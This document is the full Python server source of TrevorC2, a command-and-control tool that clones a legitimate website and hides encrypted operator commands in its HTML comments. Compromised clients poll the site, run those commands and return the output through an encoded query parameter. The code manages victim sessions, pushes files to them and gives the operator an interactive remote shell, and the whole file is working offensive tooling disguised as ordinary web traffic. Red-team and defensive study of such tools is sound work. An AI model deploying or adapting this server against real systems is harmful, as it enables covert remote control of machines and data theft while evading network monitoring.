#!/usr/bin/env python
"""
TrevorC2 - legitimate looking command and control.

Written by: Dave Kennedy @HackingDave
Website: https://www.trustedsec.com
GIT: https://github.com/trustedsec

This is the server side which will clone a website of your choosing. Once
the site is cloned, it'll place information inside the source of the html
to be decoded by the client and executed and then passed back to the server
via a query string parameter.
"""

# CONFIG CONSTANTS:
URL = ("https://www.google.com")  # URL to clone to house a legitimate website
USER_AGENT = ("User-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko")

# THIS IS WHAT PATH WE WANT TO HIT FOR CODE - THIS CAN BE WHATEVER PATH YOU WANT
ROOT_PATH_QUERY = ("/")

# THIS FLAG IS WHERE THE CLIENT WILL SUBMIT VIA URL AND QUERY STRING GET PARAMETER
SITE_PATH_QUERY = ("/images")

# THIS IS THE PATH WHERE THE FILES WILL BE DOWNLOADED FROM
FILE_PATH_QUERY = ("/files")

# THIS IS THE QUERY STRING PARAMETER USED
QUERY_STRING = ("guid=")

# THIS IS THE NAME USED IN THE COOKIE FOR THE COMMUNICATION SESSIONID
COOKIE_SESSIONID_STRING = ("sessionid")

# THIS IS THE LENGTH OF THE COMMUNICATION SESSIONID
COOKIE_SESSIONID_LENGTH = (15)

# STUB FOR DATA - THIS IS USED TO SLIP DATA INTO THE SITE, WANT TO CHANGE THIS SO ITS NOT STATIC
STUB = ("oldcss=")

# Turn to True for SSL support
SSL = False
CERT_FILE = ""  # Your Certificate for SSL

# THIS IS OUR ENCRYPTION KEY - THIS NEEDS TO BE THE SAME ON BOTH SERVER AND CLIENT FOR APPROPRIATE DECRYPTION. RECOMMEND CHANGING THIS FROM THE DEFAULT KEY
CIPHER = ("Tr3v0rC2R0x@nd1s@w350m3#TrevorForget")

# DO NOT CHANGE BELOW THIS LINE

import os
import re
import ssl
import sys
import time
import glob
import base64
try: import bleach
except ImportError:
    print("[!] Python module bleach not installed. Try pip install bleach and re-run TrevorC2 Server.")
    sys.exit()
import shutil
import logging
import urllib3
import requests
import threading
import subprocess
import collections
import string
import random
try:
    import tornado.web
    import tornado.ioloop
    import tornado.httpserver
except ImportError:
    print("[!] Python module tornado not installed. Try pip install tornado and re-run TrevorC2 Server.")
    sys.exit()
import hashlib
from Crypto import Random
from Crypto.Cipher import AES

# asyncio is python3 only - only needed for python3 regardless for tornado fix
python_version = ("")
try: import asyncio
except ImportError: python_version = "v2"


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logging.getLogger("tornado.general").setLevel(logging.CRITICAL)
logging.getLogger('urllib3').setLevel(logging.WARNING)
logging.basicConfig(level=logging.CRITICAL, format='[%(asctime)s] %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
log = logging.getLogger(__name__)

__author__ = 'Dave Kennedy (@HackingDave)'
__version__ = 0.7

__dir__ = os.path.dirname(os.path.abspath(__file__))

# ROOT CHECK
if os.geteuid() != 0:
    print("\n[!] TrevorC2 needs to be run as root (web socket binding, etc.)... Re-run TrevorC2 as sudo/root in order to run.")
    sys.exit()

# python 2/3 compatibility
try: input = raw_input
except NameError: pass

# used for registering assets
assets = []
def register_assets(sessionid,hostname,remoteip):
    global assets
    isregistered = False
    if assets != []:
        for a in assets:
            if a['sessionid'] == sessionid:
                isregistered = True

    if isregistered == False:
        asset = {'sessionid': sessionid, 'hostname': hostname, 'remoteip' : remoteip}
        assets.append(asset)
        return True
    else:
        return False

def randomString():
    """Generate a random string of fixed length """
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for i in range(COOKIE_SESSIONID_LENGTH))

# AESCipher Library Python2/3 support - http://depado.markdownblog.com/2015-05-11-aes-cipher-with-python-3-x
class AESCipher(object):
    """
    A classical AES Cipher. Can use any size of data and any size of password thanks to padding.
    Also ensure the coherence and the type of the data with a unicode to byte converter.
    """
    def __init__(self, key):
        self.bs = 16
        self.key = hashlib.sha256(AESCipher.str_to_bytes(key)).digest()

    @staticmethod
    def str_to_bytes(data):
        u_type = type(b''.decode('utf8'))
        if isinstance(data, u_type):
            return data.encode('utf8')
        return data

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * AESCipher.str_to_bytes(chr(self.bs - len(s) % self.bs))

    @staticmethod
    def _unpad(s):
        return s[:-ord(s[len(s)-1:])]

    def encrypt(self, raw):
        raw = self._pad(AESCipher.str_to_bytes(raw))
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return base64.b64encode(iv + cipher.encrypt(raw)).decode('utf-8')

    def decrypt(self, enc):
        enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')

# add cipher key here
cipher = AESCipher(key=CIPHER)

instructionsdict = {}
def set_instruction(sessionid,instruction):
    instruction_enc = cipher.encrypt(instruction.encode())
    instructionsdict[sessionid] = instruction_enc

def htc(m):
    """Decode URL for Postbacks."""
    return chr(int(m.group(1), 16))


def urldecode(url):
    """URL Decode."""
    rex = re.compile('%([0-9a-hA-H][0-9a-hA-H])', re.M)
    return rex.sub(htc, url)

def clone_site(user_agent, url):
    """Our clone site function, to get the site we want to serve.
    :params user_agent = User Agent to grab the site with.
    :params url = URL if the site you want to clone.
    """

    base_dir = os.path.join(__dir__, "clone_site/")
    # auto remove old site
    if os.path.isdir(base_dir):
        for filename in glob.glob(os.path.abspath(base_dir + "*")):
            if os.path.isdir(filename):
                shutil.rmtree(filename)
            else:
                os.remove(filename)
    else:
        os.makedirs(base_dir)

    # run our wget
    print("[*] Cloning website: " + url)
    index_html = os.path.join(base_dir, "index.html")
    try:
        web_request = requests.get(url, headers={'User-Agent': user_agent}, verify=0)
        if web_request.status_code != 200 or len(web_request.content) < 1:
            print("[!] Unable to clone the site. Status Code: %s" % web_request.status_code)
            print("[!] Exiting TrevorC2...")
            sys.exit()

        with open(index_html, 'wb') as fh:
            fh.write(web_request.content)

    except requests.ConnectionError:
        print("[-] Unable to clone website due to connection issue (are you connected to the Internet?), writing a default one for you...")
        with open(index_html, "w") as fh: fh.write("<head></head><html><body>It Works!</body></html>")

    # report success
    if os.path.isfile(index_html):
        print("[*] Site cloned successfully.")

class UnknownPageHandler(tornado.web.RequestHandler):
    """No Endpoint Handler."""

    def get(self):
        """Get Handler."""
        x_real_ip = self.request.headers.get("X-Forwarded-For")
        remote_ip = self.request.remote_ip if not x_real_ip else bleach.clean(x_real_ip)
        log.warning('Request to Invalid Page from {}'.format(remote_ip))
        self.set_header('Server', 'IIS')
        site_data = open(os.path.join(__dir__, "clone_site/index.html"), "r").read()
        self.write(site_data)
        #self.write('{"status": "ERROR: Unknown API Endpoint."}\n')
        return


class RPQ(tornado.web.RequestHandler):
    """Output IP address and close."""

    def get(self):
        """Get Handler."""
        x_real_ip = self.request.headers.get("X-Forwarded-For")
        remote_ip = self.request.remote_ip if not x_real_ip else bleach.clean(x_real_ip)
        log.warning('Request to C2 Request Handler from {}'.format(remote_ip))
        self.set_header('Server', 'IIS')
        site_data = open(os.path.join(__dir__, "clone_site/index.html"), "r").read()
        if self.get_cookie(COOKIE_SESSIONID_STRING):
            sid = self.get_cookie(COOKIE_SESSIONID_STRING)
            instructions = instructionsdict[sid]
        else:
            instructions = ""
            print("[!] Somebody without a cookie accessed the website from {}".format(remote_ip))
        site_data = site_data.replace("</body>", "<!-- %s%s --></body>" % (STUB, instructions))
        self.write(str(site_data))


class SPQ(tornado.web.RequestHandler):
    """Output IP address and close."""

    def get(self):
        """Get Handler."""
        x_real_ip = self.request.headers.get("X-Forwarded-For")
        remote_ip = self.request.remote_ip if not x_real_ip else bleach.clean(x_real_ip)
        log.warning('Request to C2 Response Handler from {}'.format(remote_ip))
        self.set_header('Server', 'IIS')

        args = self.request.arguments
        if not args:
            self.write('CACHE: FILE NOT FOUND\r\n')
            return
        for param in args:
            if param in (QUERY_STRING):
                query = args[param][0]
        if not self.get_cookie(COOKIE_SESSIONID_STRING):
            sid = randomString()
            self.set_cookie(COOKIE_SESSIONID_STRING, sid)
        else:
            sid = self.get_cookie(COOKIE_SESSIONID_STRING)
        if not sid:
            return
        if not query:
            return
        query = base64.b64decode(query)
        query_output = cipher.decrypt(query)

        # register hostnames
        if "magic_hostname=" in query_output:
            hostname = query_output.split("=")[1]
            isregistered = register_assets(sid,hostname,remote_ip)
            set_instruction(sid,"nothing")
            if isregistered == True:
                print("\n*** Received connection from {} and hostname {} with communication sid {} for TrevorC2.".format(remote_ip, hostname,sid))
            else:
                print("\n*** Reconnected {} with hostname {} and communication sid {} for TrevorC2.".format(remote_ip, hostname,sid))
        else:
            hostname = query_output.split("::::")[0]
            data = query_output.split("::::")[1]
            with open(os.path.join(__dir__, "clone_site/received_") + sid + ".txt", "w") as fh:
                fh.write('=-=-=-=-=-=-=-=-=-=-=\n(HOSTNAME: {}\nCLIENT: {})\n{}'.format(hostname, remote_ip, str(data)))
            set_instruction(sid,"nothing")

def main_c2():
    """Start C2 Server."""
    application = tornado.web.Application([
        (ROOT_PATH_QUERY, RPQ),
        (SITE_PATH_QUERY, SPQ),
        (r'' + FILE_PATH_QUERY + '/(.*)', tornado.web.StaticFileHandler, {'path':os.path.join(__dir__, 'files')}),
        (r'/.*', UnknownPageHandler)  # Make this the last line, if not matched, will hit this rule.
    ])

    try:
        if SSL:
            http_server = tornado.httpserver.HTTPServer(application, ssl_options={'certfile': CERT_FILE, 'ssl_version': ssl.PROTOCOL_TLSv1})
            http_server.listen(443)
            tornado.ioloop.IOLoop.instance().start()
        else:
            # if we are using pythonv3+
            if python_version != "v2": asyncio.set_event_loop(asyncio.new_event_loop())
            http_server = tornado.httpserver.HTTPServer(application)
            http_server.listen(80)
            tornado.ioloop.IOLoop.instance().start()
            http.start()

    except Exception as e:
        if "Address already in use" in str(e):
            print("[!] Something is already listening on the port. Stop the service and try again (hint service apache2 stop).")
            os._exit(1) # need os._exit() vs sys.exit due to inside of thread
        else:
            print("[!] Something went wrong, printing error message here: " + str(e))

if __name__ == "__main__":

    print(r"""

           ,  .'''''.  ...    ''''',  .'
            ','     ,.MMMM;.;'      '.
             ;;    ;MMMMMMMMM;     ;;'
            :'M:  ;MMMMMMMMMMM;.  :M':
            : M:  MMMMMMMMMMMMM:  :M  .
           .' M:  MMMMMMMMMMMMM:  :M. ;
           ; :M'  :MMMMMMMMMMMM'  'M: :
           : :M: .;"MMMMMMMMM":;. ,M: :
           :  ::,MMM;.M":::M.;MMM ::' :
         ,.;    ;MMMMMM;:MMMMMMMM:    :,.
         MMM.;.,MMMMMMMM;MMMMMMMM;.,;.MMM
         M':''':MMMMMMMMM;MMMMMMMM: "': M
         M.:   ;MMMMMMMMMMMMMMMMMM;   : M
         :::   MMMMMMMMMMM;MMMMMMMM   ::M
        ,'';   MMMMMMMMMMMM:MMMMMMM   :'".
      ,'   :   MMMMMMMMMMMM:MMMMMMM   :   '.
     '     :  'MMMMMMMMMMMMM:MMMMMM   ;     '
     ,.....;.. MMMMMMMMMMMMM:MMMMMM ..:....;.
     :MMMMMMMM MMMMMMMMMMMMM:MMMMMM MMMMMMMM:
     :MM''':"" MMMMMMMMMMMMM:MMMMMM "": "'MM:
      MM:   :  MMMMMMMMMMMMM:MMMMMM  ,'  :MM
      'MM   :  :MMMMMMMMMMMM:MMMMM:  :   ;M:
       :M;  :  'MMMMMMMMMMMMMMMMMM'  :  ;MM
       :MM. :   :MMMMMMMMMM;MMMMM:   :  MM:
        :M: :    MMMMMMMMM'MMMMMM'   : :MM'
        'MM :    "MMMMMMM:;MMMMM"   ,' ;M"
         'M  :    ""''':;;;'''""    :  M:
         ;'  :     "MMMMMMMM;."     :  "".
       ,;    :      :MMMMMMM:;.     :    '.
      :'     :    ,MM'''""''':M:    :     ';
     ;'      :    ;M'         MM.   :       ;.
   ,'        :    "            "'   :        '.
   '        :'                       '        ''
 .          :                        '          '
'          ;                          ;          '
          ;                            '


                   #TrevorForget

""")
    print("TrevorC2 - Legitimate Website Covert Channel")
    print("Written by: David Kennedy (@HackingDave)")
    print("https://www.trustedsec.com")
    clone_site(USER_AGENT, URL)
    PYTHONVER = sys.version_info[0]
    print('[*] Starting Trevor C2 Server...')
    threading.Thread(target=main_c2).start()

    print("[*] Next, enter the command you want the victim to execute.")
    print("[*] Client uses random intervals, this may take a few.")
    print("[*] Type help for usage. Example commands, list, interact.\n")
    try:
        while 1:
            task = input("trevorc2>")
            if task == "help" or task == "?":
                print("*** TrevorC2 Help Menu ***\n\n")
                print("Command Usage:\n")
                print("list - will list all shells available")
                print("interact <id> - allow you to select which shells to interact with")
                print("downloads - list all files in downloads\n")
                print("ifconfig - allows you to see your interface data for server\n")

            # list available shells
            if task == "list":
                counter = 0
                print("\n*** Available TrevorC2 Shells Below ***\n")
                if assets == []:
                    print("No available TrevorC2 shells.")
                else:
                    print("Format: <session_id>. <hostname> <ipaddress> <communication_sessionid>\n")
                    for a in assets:
                        counter = counter + 1
                        print(str(counter) + ". " + a['hostname'] + " " + a['remoteip'] + " " + a['sessionid']  + " (Trevor C2 Established)")
                print("\n")

            if task == "interact": print("[!] Correct usage: interact <session_id>")

            if task == "ifconfig":
                stdout = subprocess.Popen("ifconfig", shell=True)
                proc = stdout.communicate()[0]
                print(proc)

            if task == "downloads":
                print("\n*** Available TrevorC2 downloads Below ***\n")
                print("Interact with a session first and use the following format: tc2 download <filename>\n")
                files_dir = os.path.join(__dir__, "files/")
                if os.path.isdir(files_dir):
                    for filename in glob.glob(os.path.abspath((files_dir + "*"))):
                        print(os.path.basename(filename))
                print("\n")

            if task == "quit" or task == "exit":
                print("[*] Exiting TrevorC2... ")
                os.system('kill $PPID') # This is an ugly method to kill process, due to threading this is a quick hack to kill with control-c. Will fix later.


            if "interact " in task:
                if assets != []:
                    hostname_sessionid = task.split(" ")[1]
                    try:
                        hostname_select = int(hostname_sessionid) - 1
                    except ValueError:
                        hostname_select = hostname_sessionid
                    if isinstance(hostname_select, int):
                        if (hostname_select < len(assets)) and (hostname_select > -1):
                            hostname = assets[hostname_select]['hostname']
                            sid = assets[hostname_select]['sessionid']
                            print("\n*** interact with {} {}.".format(hostname,sid))
                            print("[*] Dropping into trevorc2 shell...")
                            print("[*] Use exit or back to select other shells")
                            while 1:
                                task = input(hostname + ":trevorc2>")
                                execute_task = True
                                if task == "quit" or task == "exit" or task == "back":
                                    break
                                elif task == "help" or task == "?":
                                    print("*** TrevorC2 Interact Help Menu ***\n\n")
                                    print("Command Usage:\n")
                                    print("tc2 download <filename> - download a file to this session")
                                    print("tc2 quit - stop the tc2 client\n")
                                    execute_task = False
                                elif task.lower().startswith('tc2 download'): #prepend the filepath
                                    temp_task = task.split(' ', 2)
                                    filetodownload = temp_task[2]
                                    temp_task[2] = FILE_PATH_QUERY + '/' + temp_task[2]
                                    task = ' '.join(temp_task)
                                    files_dir = os.path.join(__dir__, "files/")
                                    execute_task = False
                                    if os.path.isdir(files_dir):
                                        for filename in glob.glob(os.path.abspath((files_dir + "*"))):
                                            if os.path.basename(filename.lower()) == filetodownload.lower():
                                                execute_task = True
                                    if execute_task == False:
                                        print("The file '" + filetodownload + "' does not exist, go back and user the command 'downloads' to view all available files")

                                if execute_task:
                                    task = (hostname + "::::" + task)
                                    set_instruction(sid,task)
                                    print("[*] Waiting for command to be executed, be patient, results will be displayed here...")
                                    while 1:
                                        # we received a hit with our command
                                        received_file = os.path.join(__dir__, "clone_site/received_") + sid + '.txt'
                                        if os.path.isfile(received_file):
                                            data = open(received_file, "r").read()
                                            print("[*] Received response back from client...")
                                            print(data)
                                            # remove this so we don't use it anymore
                                            os.remove(received_file)
                                            break
                                        time.sleep(.3)
                        else :
                             print("[!] Session id {} does not exist.".format(hostname_sessionid))
                    else :
                         print("[!] Session id {} is not a valid session id.".format(hostname_sessionid))
                else:
                    print("[!] No sessions have been established to execute commands.")

    # cleanup when using keyboardinterrupt
    except KeyboardInterrupt:
        clone_site = os.path.join(__dir__, "clone_site/")
        if os.path.isdir(clone_site): shutil.rmtree(clone_site)
        print("\n\n[*] Exiting TrevorC2, covert C2 over legitimate HTTP(s).")
        os.system('kill $PPID') # This is an ugly method to kill process, due to threading this is a quick hack to kill with control-c. Will fix later.